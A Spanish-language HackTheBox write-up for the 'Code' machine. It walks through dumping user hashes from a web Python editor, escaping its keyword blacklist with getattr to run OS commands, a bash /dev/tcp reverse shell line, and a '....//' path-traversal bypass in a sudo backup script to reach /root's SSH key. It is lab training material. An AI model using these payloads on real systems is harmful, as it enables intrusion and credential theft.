---
layout: post
title:  "Code - HackTheBox"
date:   2025-08-10
categories: [HTB]
tags: [HackTheBox, Python, directory-traversal]
image: "../assets/machines/HTB/HTB_Code/logo.png"
---
**Code** es una máquina Linux de nivel **EASY** que cuenta con una aplicación web <span class="color-text-teal">Python Code Editor </span>vulnerable a la <span class="color-text-salmon">**ejecución remota de código**</span> <span class="color-text-red">(RCE)</span> mediante la elusión de Python Jail.

Puedes jugar a la maquina dando [**CLICK AQUI**](https://www.hackthebox.com/machines/Code)

![](/assets/machines/HTB/HTB_Code/info.png)

# Enumeracion

Si usamos nmap para analizar los puertos abiertos del servicio:

`nmap -T5 <IP> -n -Pn`

![](/assets/machines/HTB/HTB_Code/1.png)

Encontraremos **2 servicios activos**: 

- El puerto 22, perteneciente a <span class="color-text-red">SSH</span>.

- El puerto 5000, perteneciente a una web que almacena un editor de Python en linea.

Si vamos al editor en linea, nos toparemos con:

![](/assets/machines/HTB/HTB_Code/2.png)

Pero nos vamos a topar con una sorpresa y es que **NO** podremos ejecutar ciertos comandos, debido a que existe una restriccion:

![](/assets/machines/HTB/HTB_Code/3.png)

Si ejecutamos:

`print(globals().keys())`

Obtendremos lo siguente:

![](/assets/machines/HTB/HTB_Code/4.png)

Nos toparemos con cosas interesantes, como que:

- Usan Flask

- Existe una base de datos y distintas rutas dentro del servicio web

## Metodo de intrusion #1

Vemos que tenemos una base de datos corriendo dentro del modulo, asi que usaremos: 

`help(user)`

Y obtendremos como respuesta:

![](/assets/machines/HTB/HTB_Code/5.png)

Por lo que usaremos SQLAlchemy ORM, y corremos el siguiente comando:

`print(db.session.query(User).all())`

Obteniendo como resultado:

![](/assets/machines/HTB/HTB_Code/6.png)

Entonces, vemos que existen 2 usuarios, por lo que ejecutaremos un bucle for para obtener la informacion, en este caso su nombre y contrasena:

![](/assets/machines/HTB/HTB_Code/7.png)

Vemos que obtenemos 2 hashes, pertenecientes al usuario <span class="color-text-red">**development**</span> y <span class="color-text-red">**martin**</span>.

Antes de pasarlas a crackear, quiero decir que estos **hashes** son cadenas de 32 caracteres, lo que puede ser un <span class="color-text-orange">**HASH-MD5**</span>.

![](/assets/machines/HTB/HTB_Code/8.png)

Vemos que obtenemos la contrasena para ambos usuarios, por lo que nos queda probarlas con el usuario martin en el puerto **SSH**.

![](/assets/machines/HTB/HTB_Code/9.png)

Y listo, ya estamos dentro.

## Metodo de intrusion #2 (Mas elaborado).

Del mismo modo que enumeramos las variables globales, podemos enumerar las fuciones **built-in** del servicio <span class="color-text-lime">Python</span>.

`print(dir(print.__self__))`

![](/assets/machines/HTB/HTB_Code/10.png)

Vemos varias funciones interesantes, pero la que nos llama la atencion es **getattr**

Entonces, recordemos que existe un bloqueo de ciertas palabras, como lo son <span class="color-text-salmon">import, os</span>.

Entonces, nosotros buscamos ejecutar comandos de la siguiente forma

{% highlight python %}
a = getattr(print.__self__, '__import__')('os')
getattr(a, 'system')('<COMANDO>')
{% endhighlight %}

![](/assets/machines/HTB/HTB_Code/11.png)

Por lo que queda adecuarlo al compilador, tratando de saltarnos la blacklist:

![](/assets/machines/HTB/HTB_Code/12.png)

Como podemos ver, podemos ejecutar comandos de forma remota, por lo que nos queda ejecutar una reverse shell:
{% highlight bash %}
bash -c "bash -i&>/dev/tcp/<IP>/PUERTO 0>&1"
{% endhighlight %}
![](/assets/machines/HTB/HTB_Code/13.png)

<span class="color-text-red">Por lo que ya hemos ganado acceso a la maquina.</span>

Y del mismo modo, podremos acceder a la base de datos y ver los hashes para romper:

![](/assets/machines/HTB/HTB_Code/14.png)

# Privesc

Una vez como el usuario <span class="color-text-red">martin</span>, enumeraremos permisos a nivel de sudoers y veremos:

![](/assets/machines/HTB/HTB_Code/15.png)

Entonces, si analizamos el siguiente archivo veremos que tiene el siguiente codigo:

{% highlight bash %}
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
{% endhighlight %}

### Descubriendo la funcion vulnerable

Si analizamos el codigo, veremos que:

- Los paths "permitidos" son: **/home/** y **/var/**.

- La variable **updated_json** hace una evaluacion de caracteres especiales, especificamente el "**.** y **/**"

- Necesitaremos un archivo json.

Entonces, la via mas rapida de escapar a esta validacion es:

`En vez de hacer ../ -> ....//`

Si vemos dentro del home de **martin**, veremos que existe una carpeta llamada "**backups**".

![](/assets/machines/HTB/HTB_Code/16.png)

Lo que podemos adecuar, en este caso el parametro que nos interesa es el

`directories_to_archive`

Por lo que lo vamos a cambiar a una ruta que apunte al directorio **/root**

![](/assets/machines/HTB/HTB_Code/17.png)

Y ejecutaremos el comando con permisos de sudoers:

![](/assets/machines/HTB/HTB_Code/18.png)

Y bueno, adicionalmente tendremos una **id_rsa** dentro de la carpeta **.ssh**, por lo que podremos entrar como root:

![](/assets/machines/HTB/HTB_Code/19.png)

# FIN